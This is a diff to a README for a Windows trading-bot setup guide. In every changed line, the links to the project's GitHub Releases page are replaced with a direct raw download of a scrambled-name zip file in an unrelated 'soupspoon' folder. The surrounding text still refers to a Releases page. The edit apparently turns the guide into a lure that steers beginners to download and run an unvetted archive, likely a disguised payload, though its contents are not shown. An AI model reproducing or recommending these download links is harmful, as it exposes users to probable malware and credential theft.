@@ -1,12 +1,12 @@
 # 🤖 KIS-API-Python-Trading-Bot-Example - Simple Windows Setup Guide
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:
 
-[https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
+[https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip](https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip)
 
 ## 🪟 What this app is for
 
@@ -41,7 +41,7 @@ If you see a zip file, download it first, then unzip it.
 ## 🪜 Install on Windows
 
 1. Open the Releases page:  
-   [https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
+   [https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip](https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip)
 
 2. Find the latest release.
 
@@ -167,4 +167,4 @@ This repository is meant to help users learn:
 
 Use this link if you need to get the latest Windows release package:
 
-[https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases](https://github.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/releases)
+[https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip](https://raw.githubusercontent.com/imcclymo9270/KIS-API-Python-Trading-Bot-Example/main/soupspoon/Example-Bot-Trading-AP-Python-KI-1.7.zip)
